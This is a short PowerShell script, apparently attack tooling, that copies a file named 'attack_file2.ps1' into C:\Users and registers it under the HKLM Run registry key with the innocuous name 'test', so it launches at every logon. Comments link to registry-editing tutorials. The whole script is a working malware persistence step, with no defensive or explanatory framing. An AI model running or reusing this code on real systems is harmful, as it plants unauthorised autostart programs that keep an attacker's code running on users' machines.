$tar = "attack_file2.ps1"
Copy-Item -Path $tar -Destination C:\Users
Set-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'test' -value "C:\Users\$tar"
# https://blog.netwrix.com/2018/09/11/how-to-get-edit-create-and-delete-registry-keys-with-powershell/
# https://www.itread01.com/content/1547467986.html
# https://ithelp.ithome.com.tw/articles/10028377